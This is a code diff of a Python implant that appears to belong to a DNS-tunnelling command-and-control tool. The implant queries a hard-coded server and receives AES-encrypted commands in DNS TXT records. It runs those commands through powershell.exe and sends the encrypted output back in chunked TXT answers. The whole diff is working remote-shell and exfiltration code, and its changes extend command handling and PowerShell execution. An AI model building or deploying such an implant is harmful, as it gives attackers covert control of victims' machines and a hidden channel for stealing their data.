@@ -15,37 +15,63 @@ class Payload:
         pass
 
 def payload(addr):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    grabIP = s.getsockname()[0]
+    s.close()
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,0)
-    sock.bind(("192.168.7.202",53))
+    sock.bind((grabIP, 1234))
     query = dns.message.make_query("google.com", dns.rdatatype.TXT)
-    dns.query.send_udp(sock, query, (addr,53))
+    dns.query.send_udp(sock, query, (addr,5353))
     while 1:
-        data,address = sock.recvfrom(512)
-        dataList = list(data)
-        newDataList = list()
-        found = False
-        count = 0
-        for i in dataList:
-            if i == 33:
-                found = True
-                count += 1
-                if count == 2:
-                    break
-            elif found:
-                newDataList.append(i)
-        bytesNewDataList = bytearray(newDataList)
-        command = decrypting(bytesNewDataList, "hellothisismebob")
-        command = command.decode('utf-8')
-        command2 = ""
-        for i in repr(command):
-            if i == "'":
-                continue
-            elif i == "\\":
-                break
+        packets = bytearray()
+        commandFinished = False
+        while not commandFinished:
+            data,address = sock.recvfrom(512)
+            dataList = list(data)
+            newDataList = list()
+            found = False
+            count = 0
+            for i in dataList:
+                if i == 33:
+                    found = True
+                    count += 1
+                    if count == 2:
+                        break
+                elif found:
+                    newDataList.append(i)
+            bytesNewDataList = bytearray(newDataList)
+            #todo
+            if bytesNewDataList.decode('utf-8') != 'end':
+                packets.extend(bytesNewDataList)
             else:
-                command2 += i
-        result2 = check_output(['cmd.exe', '/c', command2])
-        finalResult = encrypting(result2.decode("utf-8"), "hellothisismebob")
+                command = decrypting(packets, "hellothisismebob")
+                command = command.decode('utf-8')
+                command2 = ""
+                for i in repr(command):
+                    if i == "'":
+                        continue
+                    elif i == "\\":
+                        break
+                    else:
+                        command2 += i
+                commandFinished = True
+
+        if len(command2.split()) == 1:
+            try:
+                result2 = check_output(['powershell.exe', '/c', command2]) #todo flag
+                finalResult = encrypting(result2.decode("utf-8"), "hellothisismebob")
+            except CalledProcessError as exec:
+                finalResult = encrypting("An error occured when running: " + command2, "hellothisismebob")
+        else:
+            seperatedCommand = ['powershell.exe','/c'] #todo flag
+            seperatedCommand += command2.split()
+            result2 = run(seperatedCommand, stdout=PIPE, stderr=PIPE, universal_newlines=True)
+            if result2.returncode == 0:
+                finalResult = encrypting("An error occured when running: " + command2, "hellothisismebob")
+            else:
+                finalResult = encrypting(result2.stdout, "hellothisismebob")
+
         if len(finalResult) >= 250:
             finalResultSeperated = list()
             eachList = ""
@@ -53,42 +79,33 @@ def payload(addr):
                 if len(eachList) <= 249 and char != (len(finalResult) - 1):
                     eachList += finalResult[char]
                 else:
-                    if char == (len(finalResult) - 1):
-                        eachList += finalResult[char]
                     eachList += finalResult[char]
                     finalResultSeperated.append(eachList)
-                    print(eachList)
                     eachList = ""
             for i in range(len(finalResultSeperated)):
                 request = DNSRecord.parse(data)
                 reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
                 reply.add_answer(*RR.fromZone("google.com TXT " + "!" + finalResultSeperated[i] + "!"))
                 resp = reply.pack()
-                sock.sendto(resp,(addr,53))
+                sock.sendto(resp,(addr,5353))
 
             request = DNSRecord.parse(data)
             reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
             reply.add_answer(*RR.fromZone("google.com TXT " + "!end!"))
             resp = reply.pack()
-            sock.sendto(resp,(addr,53))
-            time.sleep(5)
-            query = dns.message.make_query("google.com", dns.rdatatype.TXT)
-            dns.query.send_udp(sock, query, (addr,53))
+            sock.sendto(resp,(addr,5353))
+                
         else:
             request = DNSRecord.parse(data)
             reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
             reply.add_answer(*RR.fromZone("google.com TXT " + "!" + finalResult + "!"))
             resp = reply.pack()
-            sock.sendto(resp,(addr,53))
-            end = encrypting("end", "hellothisismebob")
+            sock.sendto(resp,(addr,5353))
             request = DNSRecord.parse(data)
             reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
             reply.add_answer(*RR.fromZone("google.com TXT " + "!end!"))
             resp = reply.pack()
-            sock.sendto(resp,(addr,53))
-            time.sleep(5)
-            query = dns.message.make_query("google.com", dns.rdatatype.TXT)
-            dns.query.send_udp(sock, query, (addr,53))
+            sock.sendto(resp,(addr,5353))
 
 
 def encrypting(data,key):
@@ -102,12 +119,10 @@ def encrypting(data,key):
 
 def decrypting(enc,key):
     enc = base64.b64decode(enc)
-    print(enc)
     bl = bytes(key, "utf-8")
-    print(bl)
     iv = b'\x9a\x95\xb9\xe9#c\xd9\xa5\x92CG\xf9)\x0e\xf5x'
     cipher = AES.new(bl, AES.MODE_CBC, iv)
     return cipher.decrypt(enc)
 
 
-payload("192.168.7.168")
+payload("192.168.7.168") ### Address of server
